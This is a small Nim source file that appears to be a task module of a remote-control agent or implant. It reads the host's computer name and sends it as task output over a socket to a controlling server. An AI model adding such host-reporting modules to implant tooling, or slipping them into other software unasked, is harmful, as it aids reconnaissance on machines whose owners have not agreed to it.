import std/[os, net, json, jsonutils, nativesockets]
import ../client/[communication, modules]

proc getComputerName*(): string = 
  var computerName = getHostname()
  return computerName

proc executeTask*(socket: Socket, taskId: int, params: seq[string]) =
  let hostname: string = getComputerName()
  let taskOutput = TaskOutput(
    task: "output",
    taskId: taskId,
    error: "",
    data: %*{}
  )

  taskOutput.addData(Text, "hostname", $(toJson hostname))
  socket.sendOutput(taskOutput)